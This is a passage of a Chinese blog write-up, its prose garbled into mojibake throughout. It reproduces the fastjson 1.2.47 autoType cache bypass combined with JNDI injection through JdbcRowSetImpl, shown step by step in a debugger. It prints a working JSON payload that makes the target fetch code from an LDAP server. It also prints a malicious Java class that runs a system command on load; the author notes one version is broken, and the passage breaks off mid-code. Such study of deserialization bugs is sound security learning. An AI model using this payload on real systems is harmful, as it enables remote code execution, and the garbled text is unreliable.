å…³é—­æ—¶çš„é»‘ç™½åå•æ£€æµ‹ï¼Œè°ƒç”¨æ¶æ„ç±»å®ç°æ”»å‡»ã€‚</p><p>æ‰€ä»¥æ¥ä¸‹æ¥éœ€è¦æ‰¾åˆ°å¯ä»¥æ§åˆ¶ <code>TypeUtils.mappings</code>ã€<code>deserializers</code> çš„æ–¹æ³•ã€‚è¿™é‡Œä¸»è¦å€Ÿé‰´äº†<a href="https://su18.org/post/fastjson/#7-fastjson-1247">ç´ åå…«è¿™ç¯‡æ–‡ç« </a>ï¼Œè®²å¾—ååˆ†è¯¦ç»†ï¼Œè¿™é‡Œæˆ‘æš‚æ—¶æ— æ³•è¾ƒä¸ºç‹¬ç«‹åœ°å»æŸ¥çœ‹ã€åˆ†æå„ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥ä¸»è¦æ‘˜å–<a href="https://su18.org/post/fastjson/#7-fastjson-1247">ç´ åå…«è¿™ç¯‡æ–‡ç« </a>ï¼ˆè¿™é‡Œç›´æ¥çœ‹åŸæ–‡å¾—äº†ï¼Œæˆ–è€…çœ‹æœ€ä¸‹é¢å‚è€ƒèµ„æ–™çš„<a href="https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.1387.homepage.video_card.click&vd_source=ae44e9df2e6bb265e83888153930e885">è§†é¢‘</a>é‡Œä¹Ÿæœ‰è®²è§£ï¼‰</p><p><img src="/img/fastjsonAndJNDI/ZBSTbwWhWo3QtlxwV5kcotiRnxf.png" alt="æ¥è‡ªç´ åå…«"></p><p><img src="/img/fastjsonAndJNDI/RQd5bou7go3LwVxe8Y8cfiUNn6c.png" alt="æ¥è‡ªç´ åå…«"></p><p><img src="/img/fastjsonAndJNDI/HW3pbvns9oc0W7xlOaccx2PHnrc.png" alt="æ¥è‡ªç´ åå…«"></p><p><img src="/img/fastjsonAndJNDI/EzBibGpPioWr7Px5zqscYkacnce.png" alt="æ¥è‡ªç´ åå…«"></p><p>æ€»ç»“ä¸€ä¸‹ï¼š<code>deserializers</code> æ²¡æœ‰å¯æ§åœ°å†™å…¥ç›®æ ‡ç±»çš„æ–¹æ³•ï¼Œ<code>TypeUtils.mappings</code> åˆ™å¯ä»¥ä½¿ç”¨ <code>loadClass</code> æ–¹æ³•å°†ç›®æ ‡ç±»åŠ è½½å…¥ <code>mappings</code> ç¼“å­˜ï¼Œè€Œ <code>loadClass</code> æ–¹æ³•ä¸€å…±æœ‰ä¸‰ä¸ªé‡è½½æ–¹æ³•ï¼Œå…¶ä¸­ <code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)</code> æ–¹æ³•ä¼šåœ¨ <code>fastjson</code> åŒ…ä¸­çš„ <code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code> æ–¹æ³•ä¸­è¢«è°ƒç”¨ï¼ˆ<code>MiscCodec</code> å°±æ˜¯ fastjson çš„ä¸€ä¸ªååºåˆ—åŒ–å™¨ï¼Œç”¨æ¥å¤„ç†å„ç§ååºåˆ—åŒ–ç±»ï¼‰ï¼Œç­›é€‰ä½¿ç”¨ <code>MiscCodec</code> å¤„ç†çš„ç±»ï¼Œå‘ç°å…¶ä¸­åŒ…å« <code>Class.class</code>ï¼ŒåŒæ—¶åˆšå¥½ <code>Class.class</code> ä¼šåœ¨ <code>deserializers</code> åˆå§‹åŒ–æ—¶åŠ è½½ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´å¦‚æœååºåˆ—åŒ–ç›®æ ‡ class æ˜¯ <code>Class.class</code> æ—¶ï¼Œ<code>deserializers</code> ä¸­å¯ä»¥æ‰¾åˆ°è¯¥ç±»ç›´æ¥åŠ è½½è¿”å›ï¼Œç„¶åååºåˆ—åŒ–ä¼šè°ƒç”¨ <code>MiscCodec</code> çš„ <code>loadClass</code> æ–¹æ³•ï¼Œå°†å…¶ä¸­çš„å‚æ•° strVal è¿›è¡Œç±»åŠ è½½å¹¶ç¼“å­˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆå°† <code>Class.class</code> ä½œä¸ºååºåˆ—åŒ–ç›®æ ‡ç±»æŠŠæ¶æ„åˆ©ç”¨ç±»åæ”¾åœ¨ strVal ä¸­ï¼Œä»è€Œåœ¨å¤„ç† <code>Class.class</code> ååºåˆ—åŒ–æ—¶å°†æ¶æ„åˆ©ç”¨ç±»åŠ è½½å…¥ <code>TypeUtils.mappings</code> ç¼“å­˜ï¼Œæœ€ç»ˆååºåˆ—åŒ–æ¶æ„åˆ©ç”¨ç±»æ—¶ç»•è¿‡ <code>checkAutoType()</code> çš„é»‘ç™½åå•æ£€æµ‹ã€‚</p><h2 id="JNDI-ç®€è¦åˆ†æ"><a href="#JNDI-ç®€è¦åˆ†æ" class="headerlink" title="JNDI ç®€è¦åˆ†æ"></a>JNDI ç®€è¦åˆ†æ</h2><p>åœ¨ fastjson ååºåˆ—åŒ–å¯ä»¥å®ç°åï¼Œæœ‰å„ç§é€‚ç”¨ä¸åŒæƒ…å†µçš„åˆ©ç”¨é“¾å¯ä»¥é€‰æ‹©ï¼Œè¿™é‡Œå…ˆç®€å•ç ”ç©¶ä¸€ä¸‹æ¯”è¾ƒå¸¸è§çš„é€šè¿‡ <code>com.sun.rowset.JdbcRowSetImpl</code> å®ç° JNDI æ³¨å…¥ã€‚</p><p>JNDIï¼ˆJava Naming and Directory Interfaceï¼‰ï¼Œå³ Java å‘½åå’Œç›®å½•æ¥å£ï¼Œå®ƒç”¨äºç»™ Java åº”ç”¨ç¨‹åºæä¾›å‘½åå’Œç›®å½•è®¿é—®æœåŠ¡ã€‚ç±»ä¼¼å¼€å‘æ—¶ç»å¸¸ä½¿ç”¨åˆ°çš„ jdbcï¼Œéƒ½æ˜¯æ„å»ºåœ¨æŠ½è±¡å±‚ä¸Šï¼Œjdbc ç›¸å½“äºå®ç° java ä¸ä¸€ä¸ªæ•°æ®åº“ä¹‹é—´çš„è”ç³»äº¤äº’ï¼Œè€Œ JNDI åˆ™å¯ä»¥å®ç°ä¸ç›®å½•åˆ—è¡¨ä¸­å¤šä¸ªæ•°æ®åº“åŠ¨æ€è®¿é—®ï¼Œå°†å¯¹è±¡å’Œåç§°è”ç³»åœ¨ä¸€èµ·ï¼Œå¹¶é€šè¿‡æŒ‡å®šçš„åç§°æ‰¾åˆ°ç›¸åº”çš„å¯¹è±¡ã€‚</p><p>JNDI å¯è®¿é—®çš„ç›®å½•åŠæœåŠ¡æœ‰ï¼šDNSã€XNamã€Novell ç›®å½•æœåŠ¡ã€LDAP(Lightweight Directory Access  Protocol è½»å‹ç›®å½•è®¿é—®åè®®)ã€CORBA å¯¹è±¡æœåŠ¡ã€æ–‡ä»¶ç³»ç»Ÿã€Windows XP&#x2F;2000&#x2F;NT&#x2F;Me&#x2F;9x çš„æ³¨å†Œè¡¨ã€RMIï¼ˆRemote Method Invocation è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰ã€DSML v1&amp;v2ã€NIS ç­‰ã€‚å…¶ä¸­ç›¸å¯¹å¸¸ç”¨çš„å³ RMIã€LDAPã€DNSã€CORBAã€‚JNDI å°±å¯ä»¥å½“ä½œåœ¨è¿™äº›æœåŠ¡çš„åŸºç¡€ä¸Šä¸€ä¸ªæ–¹ä¾¿ä½¿ç”¨çš„ç»Ÿä¸€çš„æ¥å£ï¼Œé€šè¿‡è¿™ä¸ªæ¥å£å»å®šä½ã€è°ƒç”¨èµ„æºã€‚</p><p>JNDI æ³¨å…¥å®ç°çš„æ ¸å¿ƒæ˜¯ <code>javax.naming.InitialContext#lookup()</code> å‚æ•°å¯æ§ï¼Œ<code>lookup()</code> å‡½æ•°ç”¨äºæŸ¥æ‰¾ä¼ å…¥çš„å¯¹è±¡åç§°å‚æ•°å¯¹åº”çš„å¯¹è±¡ï¼Œå¯ä»¥æŒ‡å®š url æ¥ç»‘å®šè¿œç¨‹å¯¹è±¡åŠ è½½ï¼Œä¹‹åæ‰§è¡Œè¯¥ç±»çš„é™æ€ä»£ç å—ã€ä»£ç å—ã€æ— å‚æ„é€ å‡½æ•°å’Œ <code>getObjectInstance</code> æ–¹æ³•ã€‚æ˜¾è€Œæ˜“è§çš„æ˜¯ï¼Œæ§åˆ¶äº† <code>lookup()</code> å‚æ•°å°±å¯èƒ½å®ç°è¿œç¨‹å‘ç›®æ ‡æœåŠ¡å™¨åŠ è½½æ¶æ„ä»£ç ã€‚å…·ä½“åŸç†å¯ä»¥å‚ç…§ <a href="https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">myzxcg çš„åŸºç¡€æ¦‚å¿µ</a>ã€<a href="https://www.cnblogs.com/nice0e3/p/13958047.html#0x02-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">nice_0e3</a><a href="https://www.cnblogs.com/nice0e3/p/13958047.html#0x02-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">çš„å‰ç½®çŸ¥è¯†</a>ã€‚</p><p>JNDI æ³¨å…¥å¸¸ç”¨çš„åè®®ä¸º rmi å’Œ ldapï¼Œå„è‡ªéƒ½æœ‰ä¸€äº›ä½¿ç”¨é™åˆ¶å¦‚ä¸‹</p><p><img src="/img/fastjsonAndJNDI/OVLVbHvzwoMxdjx3hKsc05BUnyh.png" alt="æ¥è‡ªmyzxcg"></p><h1 id="æ”»å‡»å®ç°æµç¨‹åˆ†æ"><a href="#æ”»å‡»å®ç°æµç¨‹åˆ†æ" class="headerlink" title="æ”»å‡»å®ç°æµç¨‹åˆ†æ"></a>æ”»å‡»å®ç°æµç¨‹åˆ†æ</h1><p>idea ä¸­è¿æŒ‰ä¸¤ä¸‹ shift æœç´¢ <code>checkAutoType()</code> æ‰“ä¸ªæ–­ç‚¹ï¼ˆ<code>autoTypeSupport</code> æ˜¯é»˜è®¤å…³é—­çš„çŠ¶æ€ï¼‰</p><p>å‘æœ¬åœ°æœåŠ¡å‘åŒ… json å‚æ•°è®©ç›®æ ‡ååºåˆ—åŒ–å¤„ç†ï¼Œä½¿ç”¨çš„ payload ç”±ä¸Šé¢çš„åˆ†æä¸­å¾—æ¥ï¼šå…ˆå°† <code>Class.class</code> ååºåˆ—åŒ–ï¼ˆæœ¬èº«ä¼š <code>deserializers</code> åˆå§‹åŒ–æ—¶åŠ è½½ï¼Œ<code>deserializers</code> ä¸­å¯ä»¥æ‰¾åˆ°è¯¥ç±»ï¼Œä»è€Œä¸å—é»‘ç™½åå•é™åˆ¶ï¼‰ï¼ŒåŠ è½½çš„è¿‡ç¨‹ä¸­å°† <code>&quot;val&quot;</code> ä¸­çš„ <code>JdbcRowSetImpl</code> åŠ è½½å…¥ <code>TypeUtils.mappings</code> ç¼“å­˜ï¼›ç„¶åå†ååºåˆ—åŒ– <code>JdbcRowSetImpl</code> ç±»ï¼Œç”±äºå¯ä»¥åœ¨ <code>mappings</code> ç¼“å­˜ä¸­æ‰¾åˆ° <code>JdbcRowSetImpl</code> ç±»ï¼Œæ‰€ä»¥ç›´æ¥åŠ è½½å¯¹è±¡å¹¶è¿”å›ï¼Œç»•è¿‡é»‘ç™½åå•æ£€æŸ¥ï¼›åŠ è½½å¯¹è±¡åè¿æ¥ <code>&quot;dataSourceName&quot;</code> çš„è¿œç¨‹ ldap æœåŠ¡å¹¶æ‰§è¡Œè¿œç¨‹å¯¹è±¡æ¶æ„ä»£ç å®ç° JNDI æ³¨å…¥ã€‚</p><p>ç¬¬ä¸€ä¸ªå¯¹è±¡å°†æŒ‡å®šç±»å­˜å…¥ç¼“å­˜ç»•è¿‡ fastjson æ£€æµ‹ï¼Œç¬¬äºŒä¸ªå¯¹è±¡ç”¨æ¥è§¦å‘ JNDI æ³¨å…¥ã€‚</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:8085/PrIXqXOz&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="fastjson-éƒ¨åˆ†"><a href="#fastjson-éƒ¨åˆ†" class="headerlink" title="fastjson éƒ¨åˆ†"></a>fastjson éƒ¨åˆ†</h2><p>ç¬¬ä¸€è½®è°ƒç”¨ <code>checkAutoType()</code>ï¼Œå¤„ç† <code>java.lang.Class</code></p><p><img src="/img/fastjsonAndJNDI/EGAIbA47XonaJPxVLD0cZoxEnkg.png"></p><p>åˆæ­¥ hash å¤„ç†å <code>autoTypeSupport</code> é»˜è®¤å…³é—­ï¼Œä¼ å…¥å‚æ•° <code>expectClass</code> ä¸º nullï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªé»‘ç™½åå•ä¸æ£€æŸ¥</p><p><img src="/img/fastjsonAndJNDI/FMzvbE2ZUoxTGdxQgrScq23Gn5b.png"></p><p><code>deserializers</code> ä¸­æ‰¾åˆ°è¯¥ç±»ï¼ŒåŠ è½½å¹¶è¿”å›</p><p><img src="/img/fastjsonAndJNDI/Xt7gb0myXo5rD3xo50vcao6Pn7b.png"></p><p>ç¬¬ä¸€è½® <code>checkAutoType()</code> ç»“æŸï¼Œå›åˆ° DefaultJSONParser</p><p><img src="/img/fastjsonAndJNDI/PXXrbSExmoY4VPxz0aBcFYy4nae.png"></p><p>å‘åæ­¥è¿‡å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–å¤„ç† <code>obj = deserializer.deserialze(this, clazz, fieldName);</code>ï¼Œä½¿ç”¨çš„ååºåˆ—åŒ–å™¨å³å‰é¢æåˆ°çš„ <code>MiscCodec</code>ï¼Œæˆ‘ä»¬åœ¨è¿™å¥æ­¥å…¥è§‚å¯Ÿååºåˆ—åŒ–å¤„ç†è¿‡ç¨‹</p><p><img src="/img/fastjsonAndJNDI/NKYebUFU9oGVaWx6XTUcr7Ahnje.png"></p><p>å‘åæ­¥è¿‡ï¼Œå¼€å§‹å¤„ç†å‚æ•° <code>&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</code></p><p><img src="/img/fastjsonAndJNDI/EKhpbHYIqoIIBuxGswicLz3DnWe.png"></p><p>éšå <code>objVal</code> å°±å°†å‚æ•°ä¸­çš„ç±»åå­—ç¬¦ä¸²èµ‹å€¼ç»™å‰é¢æåˆ°çš„ <code>strVal</code>ï¼Œå½“ <code>strVal</code> éç©ºå°±é€ä¸ªåŒ¹é…å½“å‰ååºåˆ—åŒ–çš„ç±»</p><p><img src="/img/fastjsonAndJNDI/Gt3Vb2X2MotFaLxu6eXcTkZ2nxf.png"></p><p>åŒ¹é…åˆ° <code>Class.class</code>ï¼Œäºæ˜¯åŠ è½½ <code>strVal</code> ç±»å¹¶è¿”å›ï¼Œè¿™é‡Œé€‰ä¸­ <code>loadClass</code> æ­¥å…¥è§‚å¯Ÿ <code>JdbcRowSetImpl</code> åŠ è½½è¿‡ç¨‹</p><p><img src="/img/fastjsonAndJNDI/Ub0Fb9ZIpoTf1bx1ktxc2IEknxd.png"></p><p>ç»§ç»­æ­¥å…¥ <code>loadClass</code>ï¼Œæ³¨æ„å½“å‰ç‰ˆæœ¬ cache é»˜è®¤ä¸º trueï¼Œè¿™ä¹Ÿæ˜¯è¿™ä¸ªç‰ˆæœ¬ç¼“å­˜ç»•è¿‡æ–¹æ³•å¯è¡Œçš„åŸå› ä¹‹ä¸€</p><p><img src="/img/fastjsonAndJNDI/GcsibIxfcoBQ6jx7rFLcl22qnHf.png"></p><p>æ£€æµ‹ç±»å <code>className</code> éç©º</p><p><img src="/img/fastjsonAndJNDI/N8eVb77ogo9BnAxYp0kcCVUgnkd.png"></p><p>å°è¯•ä» <code>mappings</code> ç¼“å­˜ä¸­è·å–ç±»åä¸º <code>com.sun.rowset.JdbcRowSetImpl</code> çš„å¯¹è±¡</p><p><img src="/img/fastjsonAndJNDI/HCwlbegP0o8PkhxGeKqcZpRpnjh.png"></p><p>æ­£å¸¸æƒ…å†µä¸‹ç¼“å­˜ä¸­æ²¡æœ‰ <code>com.sun.rowset.JdbcRowSetImpl</code>ï¼Œè¿”å› clazz ä¸º nullï¼Œæ— æ³•ç›´æ¥è¿”å› clazzã€‚ï¼ˆç¬¬ä¸€æ¬¡è¿è¡Œæ—¶æ˜¯è¿™æ ·ï¼ŒæˆåŠŸä¸€æ¬¡å <code>mappings</code> ä¸­å°±æœ‰äº†ï¼Œä¸ä¼šå‡ºç°è¿™å¼ å›¾ï¼‰</p><p><img src="/img/fastjsonAndJNDI/MXcMbxwmXo1iVTxlvZDcmtCVnvd.png"></p><p>å½“ç¼“å­˜ä¸­å·²æœ‰ <code>com.sun.rowset.JdbcRowSetImpl</code> æ—¶å¦‚ä¸‹å›¾ï¼Œå®ƒå°±ä¸ä¼šç»§ç»­åŠ è½½ï¼Œç›´æ¥è¿”å›ã€‚ï¼ˆæƒ³çœ‹ä¸Šå›¾åˆ™é‡å¯é¡¹ç›®å†è°ƒè¯•ä¸€éï¼‰</p><p><img src="/img/fastjsonAndJNDI/SgSTbiT4xotwYExKUXocZ0pwn3G.png"></p><p>åˆ¤æ–­æ˜¯å¦ <code>[</code> å¼€å¤´æˆ– <code>L</code> å¼€å¤´ <code>;</code> ç»“å°¾</p><p><img src="/img/fastjsonAndJNDI/F2g3bxZYvobplrxjtZCcVVWpnnh.png"></p><p>ç»§ç»­å‘åæ­¥è¿‡ï¼Œå› ä¸ºå‰é¢ä¼ å…¥çš„å‚æ•°ä¸º <code>getDefaultClassLoader()</code>ï¼Œè€Œ <code>com.sun.rowset.JdbcRowSetImpl</code> ç±»æ²¡æœ‰æŒ‡å®šçš„é»˜è®¤ <code>classLoader</code>ï¼Œæ‰€ä»¥ä¸º nullã€‚æ­¤å¤„ç”¨ <code>contextClassLoader.loadClass(className)</code> åŠ è½½ç±»ï¼Œå¹¶ cache ä¸º true çš„æƒ…å†µä¸‹å°†å…¶æ”¾å…¥ <code>mappings</code> ç¼“å­˜ï¼Œæœ€å return è¿”å›</p><p><img src="/img/fastjsonAndJNDI/BKvpbsiz3oMzLJxt73mcCrylndc.png"></p><p>é©¬ä¸Š <code>mappings</code> é‡Œå°±æ‰¾å¾—åˆ° <code>com.sun.rowset.JdbcRowSetImpl</code> äº†</p><p><img src="/img/fastjsonAndJNDI/JqHMbkNLBoHTxZxvGZfcSso3n2g.png"></p><p>åç»­ç›´æ¥æŒ‰ä¸€æ¬¡æ¢å¤ç¨‹åºæŒ‰é’®åˆ°æ–­ç‚¹å¤„ï¼Œç¬¬äºŒè½®è°ƒç”¨ <code>checkAutoType()</code>ï¼Œå¤„ç† <code>com.sun.rowset.JdbcRowSetImpl</code>ï¼Œç¬¬ä¸€ä¸ªé»‘ç™½åå•åŒæ ·ä¸æ£€æŸ¥</p><p><img src="/img/fastjsonAndJNDI/OsshbUeaKoHMzPxY09Uc4SoZnae.png"></p><p>æ­¥è¿‡åˆ° <code>TypeUtils.mappings</code>ã€<code>deserializers</code> æŸ¥æ‰¾</p><p><img src="/img/fastjsonAndJNDI/SWSubfWXgopJDuxirm4cPFjsndc.png"></p><p>å¯ä»¥ä» <code>TypeUtils.mappings</code> æ‰¾åˆ° <code>JdbcRowSetImpl</code></p><p><img src="/img/fastjsonAndJNDI/RSKkbd2KlobPZKxUmCSccPiHnYe.png"></p><p>è¿”å› clazzï¼Œè‡³æ­¤ç¬¬äºŒè½® <code>checkAutoType()</code> ç»“æŸï¼ŒæˆåŠŸåˆ©ç”¨ç¼“å­˜æœºåˆ¶ç»•è¿‡äº†é»‘åå•æ£€æµ‹</p><p><img src="/img/fastjsonAndJNDI/HNRob7q2LovezHxnjUhcgmsVnXg.png"></p><p>å›åˆ° DefaultJSONParser</p><p><img src="/img/fastjsonAndJNDI/LFcSbw1edoX53jxpndDcAIUwnUe.png"></p><h2 id="JNDI-éƒ¨åˆ†"><a href="#JNDI-éƒ¨åˆ†" class="headerlink" title="JNDI éƒ¨åˆ†"></a>JNDI éƒ¨åˆ†</h2><p>åŒä¹‹å‰ä¸€æ ·æ­¥å…¥ååºåˆ—åŒ–å¤„ç† <code>obj = deserializer.deserialze(this, clazz, fieldName);</code> ä½†æ­¤å¤„ <code>fieldName</code> ä¸ä¸º null</p><p><img src="/img/fastjsonAndJNDI/E68IbUqMmouMhux3e87cpx7Nnmc.png"></p><p>ç»§ç»­æ­¥å…¥ï¼Œ<code>features</code> é»˜è®¤ä¸º 0</p><p><img src="/img/fastjsonAndJNDI/UD6hbjy9Hohy8fxriDAcN615n4e.png"></p><p>è¿™é‡Œä¸æ¸…æ¥šä»€ä¹ˆåŸå› æ²¡è°ƒè¿›å»ï¼Œä¿®æ”¹äº†ä¸€ä¸‹ debug çš„æ­¥å…¥è®¾ç½®ä¹Ÿä¸æˆï¼Œ</p><p><img src="/img/fastjsonAndJNDI/Zys3bZWG1ovJpIxSAWhcLFRpnle.png"></p><p>æ‰€ä»¥ç›´æ¥åœ¨ <code>JdbcRowSetImpl</code> æ–‡ä»¶é‡ŒæŸ¥æ‰¾ <code>lookup()</code> å‡½æ•°æ‰“æ–­ç‚¹</p><p><img src="/img/fastjsonAndJNDI/B2X9bngFaoyaLzxffZPcUsMwnog.png"></p><p>æ­¥å…¥æ­¤å¤„ <code>lookup()</code></p><p><img src="/img/fastjsonAndJNDI/DGWCbWBmPoTSuZxpWqcc4aLHn7e.png"></p><p>é¢ä¼¼ä¹æ­¥å…¥çš„æ˜¯ <code>getDataSourceName()</code>ï¼Œè·å– <code>DataSourceName</code> å‚æ•°å†…å®¹</p><p><img src="/img/fastjsonAndJNDI/VBpBbwOvDoYvYSxFHbTc7hnJnzc.png"></p><p>æ­¥è¿‡å›åˆ°åˆšæ‰çš„ä½ç½®å†æ¬¡æ­¥å…¥å°±è¿›åˆ° <code>lookup()</code> å‡½æ•°çš„è°ƒç”¨äº†ï¼Œä½äº <code>InitialContext</code> ç±»ï¼ˆå¯ä»¥å‚è€ƒ<a href="https://www.cnblogs.com/nice0e3/p/13958047.html#initialcontext%E7%B1%BB">è¿™é‡Œ</a>äº†è§£ä¸€ä¸‹ï¼‰ã€‚ç»§ç»­æ­¥å…¥ï¼Œé€‰ä¸­ <code>lookup(name)</code></p><p><img src="/img/fastjsonAndJNDI/CKaUbhWlIoaaIhx9orlcoDL1nHh.png"></p><p>è¿›å…¥ <code>ldapURLContext</code> ç±»ï¼Œç»§ç»­å‘ <code>lookup(var1)</code> æ­¥å…¥</p><p><img src="/img/fastjsonAndJNDI/O93jbV5GZoMg05xFqt3cdOLQnCd.png"></p><p>è¿›å…¥ <code>GenericURLContext</code> ç±»ï¼Œå…ˆ <code>this.getRootURLContext(var1, this.myEnv)</code> å’Œ <code>var2.getResolvedObj()</code> å¤§æ¦‚å¯¹å‚æ•°åšä¸€ä¸‹è§£æï¼Œè·å–å…¶ä¸­çš„ ldap æœåŠ¡ ip å’Œè¿œç¨‹ç±»å</p><p><img src="/img/fastjsonAndJNDI/TpR3bgnLHoiXJdxZ5cUcyxa4nAV.png"></p><p>å°è¯•ç»§ç»­æ­¥å…¥ <code>lookup(var2.getRemainingName())</code> é€‰ä¸­ <code>lookup</code></p><p><img src="/img/fastjsonAndJNDI/TVpMbZ69AoACdSxbPDUcFDz5niN.png"></p><p>è¯¥å¥æ­¥è¿‡ååˆ™ç»“æŸè·³å‡ºåˆ°ä¸‹å›¾äº†ï¼Œæ²¡æœ‰å†ç»§ç»­æ·±å…¥åˆ†æä¸‹å»äº†â€¦â€¦</p><p><img src="/img/fastjsonAndJNDI/RYxibeFlkoztihxTM23cQoqEnEg.png"></p><p>æ¶æ„ä»£ç æˆåŠŸæ‰§è¡Œï¼Œç³»ç»Ÿå‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œå¼¹å‡ºè®¡ç®—å™¨</p><h2 id="è¡¥å……ï¼šldap-æœåŠ¡ç«¯"><a href="#è¡¥å……ï¼šldap-æœåŠ¡ç«¯" class="headerlink" title="è¡¥å……ï¼šldap æœåŠ¡ç«¯"></a>è¡¥å……ï¼šldap æœåŠ¡ç«¯</h2><p>ä¸ºäº†æ–¹ä¾¿ã€èŠ‚çœæ—¶é—´ï¼Œç”¨çš„ Yakit çš„åè¿æœåŠ¡å™¨æ­å»º ldap æœåŠ¡ç«¯ï¼Œç”¨ marshalsec ä¹Ÿ OKï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šç°æˆçš„æ‹¿æ¥æ”¹ä¸€ä¸‹å³å¯ã€‚</p><p><img src="/img/fastjsonAndJNDI/PJQabTVjqoF9vaxRJXqcTpJwnIe.png"></p><p>ç”Ÿæˆçš„æ¶æ„åˆ©ç”¨ç±» payload å¦‚ä¸‹ï¼ˆå­˜ç–‘ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> defaultpackagename;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrIXqXOz</span> &#123;<br>        <span class="hljs-keyword">static</span>  &#123;<span class="hljs-comment">//é™æ€ä»£ç å—ï¼Œé¦–æ¬¡åŠ è½½æ—¶è‡ªåŠ¨æ‰§è¡Œ</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">var0</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<span class="hljs-comment">//è¦æ‰§è¡Œçš„å‘½ä»¤</span><br>                <span class="hljs-comment">//é€šè¿‡æ–‡ä»¶åˆ†éš”ç¬¦æ£€æµ‹Unix/Linuxç³»ç»Ÿ</span><br>                <span class="hljs-comment">//è¿™é‡Œä¼¼ä¹æœ‰äº›é—®é¢˜ Windowsç³»ç»Ÿè¿”å›&quot;\&quot;ï¼Œåº”è¯¥å†å†™ä¸€ä¸ªelseï¼Ÿ</span><br>                <span class="hljs-comment">//ä½†æ˜¯æ— è®ºå¦‚ä½•å¤ç°æ—¶åœ¨windowsä¸Šæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„</span><br>                <span class="hljs-keyword">if</span> (File.separator.equals(<span class="hljs-string">&quot;/&quot;</span>))&#123;<br>                        String[] var1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<span class="hljs-comment">//ç©ºçš„ï¼Ÿï¼Ÿï¼Ÿ</span><br>                &#125;<br>                <span class="hljs-keyword">try</span>&#123;<br>                        Runtime.getRuntime().exec(var1);<span class="hljs-comment">//ç”¨Runtimeç±»æ‰§è¡Œ</span><br>                &#125;<span class="hljs-keyword">catch</span>(IOException var1)&#123;<br>                        var1.printStackTrace();<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­£å¸¸åº”è¯¥æ˜¯è¿™æ ·çš„å§ï¼š</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> defaultpackagename;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">PrIXqXOz</span> </span>&#123;<br>        <span class="hljs-keyword">static</span>  &#123;<span class="hljs-comment">//é™æ€ä»£ç å—ï¼Œé¦–æ¬¡åŠ è½½æ—¶è‡ªåŠ¨æ‰§è¡Œ</span><br>                <span class="hljs-keyword">String</span>[] var1;<br>                <span class="hljs-keyword">if</span> (File.separator.equals(<span class="hljs-string">&quot;/&quot;</span>))&#123;<span class="hljs-comment">//é€šè¿‡æ–‡ä»¶åˆ†éš”ç¬¦æ£€æµ‹ Unix/Linuxç³»ç»Ÿ</span><br>                        var1 = <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//é€šè¿‡æ–‡ä»¶åˆ†éš”ç¬¦æ£€æµ‹ windowsç³»ç»Ÿ</span><br>                        var1 = <span class="hljs-keyword">new</span> <span 